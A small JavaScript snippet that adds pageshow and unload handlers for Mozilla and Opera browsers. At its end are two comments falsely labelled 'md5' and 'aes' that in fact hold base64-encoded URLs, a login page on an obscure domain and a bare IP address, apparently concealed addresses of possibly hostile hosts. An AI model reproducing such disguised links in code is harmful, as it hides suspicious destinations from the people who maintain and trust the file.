if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovL20uZmN4ZHNzbmZmdmJkZXYxMi54eXovbG9naW4=**//** aes:aHR0cDovLzE2LjE2Mi4xMDUuMTQ1**/